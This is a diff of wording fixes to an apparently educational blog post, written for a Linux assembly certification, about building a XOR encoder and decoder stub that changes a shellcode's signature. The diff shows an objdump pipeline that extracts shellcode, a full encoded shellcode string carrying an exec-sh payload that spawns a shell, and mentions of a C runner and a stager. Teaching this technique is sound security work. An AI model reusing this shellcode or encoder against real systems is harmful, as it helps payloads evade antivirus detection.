@@ -24,7 +24,7 @@ However, for demonstrating how bypassing signature detection can look like, this
 
 ## The Encoder
 
-I have chosen to write the encoder in Python because it's very easy to implement these kinds of scripts in it.
+I have chosen to write the encoder in Python because it's very easy to implement these kinds of scripts with it.
 
 ```python
 import sys
@@ -100,7 +100,7 @@ The shellcode used in the example above is a simple `exec-sh` shellcode which wi
 
 ## Writing the decoder stub
 
-It's time to write the decoder stub. The following is a simple program for looping through the shellcode, XORing bytes, reconstructing the original shellcode.
+It's time to write the decoder stub. The following is a simple program for looping through the shellcode, XORing bytes and reconstructing the original shellcode.
 
 ```asm
 ;-------------------------------------
@@ -158,13 +158,13 @@ dubs3c
 $
 ```
 
-We can also extract the shellcode and use e.g. in a stager:
+We can also convert this program into shellcode and use it in e.g. a stager:
 ```bash
 dubs3c@slae:~/SLAE/EXAM/github/assignment_4$ objdump -d ./build/ass4|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\xeb\x25\x5e\x8d\x7e\x01\x31\xc0\x31\xdb\x31\xd2\x31\xc9\x8a\x1c\x06\x80\xf3\xaa\x74\x16\x8a\x14\x06\x8a\x5c\x06\x01\x30\xda\x88\x14\x0e\x04\x02\x41\xeb\xe7\xe8\xd6\xff\xff\xff\x01\xfd\xa2\x19\x60\x7b\x7d\xec\xac\x61\xac\x64\x31\xda\x2b\x27\xb1\xef\x0d\x5b\x66\x57\xa5\xbb\xc7\x6a\xac\xad\x41\x82\x7a\xff\x05\xc5\xf4\x81\xf1\x06\x99\x5a\x54\xbc\xac\x43\x28\xd7\x04\xfb\x1b\xe4\x11\x3b\x35\x76\xdc\x43\x57\xf7\x4f\x6d\xe1\xad\xd7\x84\x6c\x35\x62\xb0\x7b\xc6\x7f\xc3\x80\x7b\x1f\x54\x45\x0e\xa9\x88\x97\x5d\x84\xc6\xe9\x93\x6c\x0a\x6f\xf2\x7a\x25\xe0\x50\x88\x6e\x3b\xe5\x56\x09\x6f\x25\xae\x49\xe3\x3d\xaa\xaa"
 ```
 
-The shellcode could be embedded in a somple C program that will execute the decoder program, containing our `exec-sh` shellcode.
+The shellcode could be embedded in a simple C program that will execute the decoder program, containing our `exec-sh` shellcode.
 
 ```c
 #include<stdio.h>
@@ -192,7 +192,7 @@ dubs3c
 $
 ```
 
-That's it, happy hacking :)
+That's it, we have created a simple encoder for automatically changing the signature of our shellcode.
 
 ---
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
